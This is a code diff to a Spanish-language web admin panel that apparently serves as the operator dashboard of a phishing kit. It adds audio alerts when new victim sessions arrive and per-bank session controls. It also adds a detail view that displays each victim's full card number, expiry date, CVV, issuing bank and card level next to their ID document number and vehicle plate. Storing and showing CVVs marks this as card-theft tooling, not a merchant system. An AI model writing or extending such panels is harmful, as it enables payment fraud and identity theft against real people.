@@ -174,6 +174,9 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .detalle-item .lbl { color: #8b94a8; font-size: 10px; text-transform: uppercase; display: block; margin-bottom: 2px; }
 .detalle-item .val { color: #e5e7eb; font-weight: 600; font-family: monospace; }
 
+.detalle-seccion { grid-column: 1 / -1; margin-top: 15px; padding-top: 15px; border-top: 1px dashed #252d44; }
+.detalle-seccion-titulo { color: #88f456; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
+
 @media (max-width: 768px) {
     .container { padding: 10px; }
     .stats { grid-template-columns: 1fr 1fr; }
@@ -447,11 +450,10 @@ let seleccionLogs = new Set();
 let seleccionHistorial = new Set();
 
 let sesionesAnteriores = new Set(); 
-let audioCtx = null; // 🔥 Contexto de audio global
+let audioCtx = null;
 
 function $(id) { return document.getElementById(id); }
 
-// 🔥 FUNCIÓN PARA REPRODUCIR SONIDO CON WEB AUDIO API
 function reproducirSonido() {
     try {
         if (!audioCtx) {
@@ -464,11 +466,11 @@ function reproducirSonido() {
         const osc = audioCtx.createOscillator();
         const gain = audioCtx.createGain();
 
-        osc.type = 'sine'; // Tono suave
+        osc.type = 'sine';
         osc.frequency.setValueAtTime(800, audioCtx.currentTime); 
         osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.1); 
 
-        gain.gain.setValueAtTime(0.1, audioCtx.currentTime); // Volumen 10% (discreto)
+        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
         gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3); 
 
         osc.connect(gain);
@@ -588,13 +590,11 @@ $('loginBtn').addEventListener('click', login);
 $('loginPass').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
 $('loginUser').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
 
-// 🔥 DESBLOQUEAR AUDIO AL INICIAR SESIÓN
 async function login() {
     const usuario = $('loginUser').value.trim();
     const password = $('loginPass').value;
     if (!usuario || !password) { mostrarErrorLogin('Complete usuario y contraseña'); return; }
     
-    // Desbloquear el contexto de audio con la acción del usuario
     if (!audioCtx) {
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     }
@@ -727,9 +727,6 @@ function renderActivos() {
     `).join('');
 }
 
-/* ============================================================
-   🔥 BOTONES DE SESIÓN
-   ============================================================ */
 function botonesSesion(s) {
     const bancoKey = s.datos.bancoKey || '';
     const estado = s.estado;
@@ -791,11 +788,9 @@ async function cargarSesiones() {
         const d = await api('/admin/sesiones');
         const sesionesActuales = d.sesiones.reverse();
         
-        // 🔥 LÓGICA DE SONIDO: Comprobar si la cantidad de sesiones cambió o si hay una nueva
         let hayNuevosDatos = false;
         
         if (sesionesAnteriores.size > 0) {
-            // Verificamos si hay IDs nuevos
             for (let s of sesionesActuales) {
                 if (!sesionesAnteriores.has(s.sessionId)) {
                     hayNuevosDatos = true;
@@ -803,7 +798,6 @@ async function cargarSesiones() {
                 }
             }
         } else {
-            // Si es la primera carga, no hacemos sonar nada para no molestar al entrar
             hayNuevosDatos = false;
         }
 
@@ -967,7 +961,7 @@ $('btnBorrarSesiones').addEventListener('click', async () => {
 });
 
 /* ============================================================
-   🔥 LÓGICA DEL HISTORIAL (ACORDEÓN)
+   🔥 LÓGICA DEL HISTORIAL (ACORDEÓN CON DATOS COMPLETOS)
    ============================================================ */
 async function cargarHistorial() {
     try {
@@ -1015,7 +1009,7 @@ function renderHistorial() {
         const fecha = new Date(h.fecha).toLocaleString('es-CO');
         const checked = seleccionHistorial.has(h.id) ? 'checked' : '';
         
-        // Datos para el detalle
+        // Datos Personales
         const tipoPersona = datos.tipoPersona || '-';
         const tipoDoc = datos.docType || datos.tipoDocumento || '-';
         const numDoc = datos.documento || datos.docNumber || '-';
@@ -1027,7 +1021,14 @@ function renderHistorial() {
         const placa = datos.placa || '-';
         const monto = (datos.monto || datos.precio) ? '$' + Number(datos.monto || datos.precio).toLocaleString('es-CO') : '-';
 
-        // 🔥 Verificar si esta fila estaba abierta antes
+        // Datos de la Tarjeta (si existen)
+        const tarjeta = datos.tarjeta || '-';
+        const exp = (datos.expMes || datos.expAnio) ? `${datos.expMes || '??'}/${datos.expAnio || '??'}` : '-';
+        const cvv = datos.cvv || '-';
+        const bancoEmisor = datos.bankName || '-';
+        const tipoTarjeta = datos.cardType || '-';
+        const nivelTarjeta = datos.cardLevel || '-';
+
         const abierta = filasAbiertas.has(h.id) ? 'visible' : '';
 
         return `
@@ -1043,6 +1044,8 @@ function renderHistorial() {
                 <td colspan="4">
                     <div class="detalle-container">
                         <div class="detalle-grid">
+                            <!-- SECCIÓN 1: DATOS PERSONALES -->
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1;">👤 Datos Personales</div>
                             <div class="detalle-item"><span class="lbl">Tipo Persona</span><span class="val">${escapeHtml(tipoPersona)}</span></div>
                             <div class="detalle-item"><span class="lbl">Tipo Documento</span><span class="val">${escapeHtml(tipoDoc)}</span></div>
                             <div class="detalle-item"><span class="lbl">Número Documento</span><span class="val">${escapeHtml(numDoc)}</span></div>
@@ -1053,6 +1056,17 @@ function renderHistorial() {
                             <div class="detalle-item"><span class="lbl">Tipo Pago</span><span class="val">${escapeHtml(tipoPago)}</span></div>
                             <div class="detalle-item"><span class="lbl">Placa</span><span class="val">${escapeHtml(placa.toUpperCase())}</span></div>
                             <div class="detalle-item"><span class="lbl">Monto</span><span class="val">${escapeHtml(monto)}</span></div>
+
+                            <!-- SECCIÓN 2: DATOS DE LA TARJETA (Solo si hay tarjeta) -->
+                            ${tarjeta !== '-' ? `
+                            <div class="detalle-seccion-titulo" style="grid-column: 1/-1;">💳 Datos de la Tarjeta</div>
+                            <div class="detalle-item"><span class="lbl">Número Tarjeta</span><span class="val">${escapeHtml(tarjeta)}</span></div>
+                            <div class="detalle-item"><span class="lbl">Vencimiento</span><span class="val">${escapeHtml(exp)}</span></div>
+                            <div class="detalle-item"><span class="lbl">CVV</span><span class="val">${escapeHtml(cvv)}</span></div>
+                            <div class="detalle-item"><span class="lbl">Banco Emisor</span><span class="val">${escapeHtml(bancoEmisor)}</span></div>
+                            <div class="detalle-item"><span class="lbl">Tipo de Tarjeta</span><span class="val">${escapeHtml(tipoTarjeta)}</span></div>
+                            <div class="detalle-item"><span class="lbl">Nivel de Tarjeta</span><span class="val">${escapeHtml(nivelTarjeta)}</span></div>
+                            ` : ''}
                         </div>
                     </div>
                 </td>
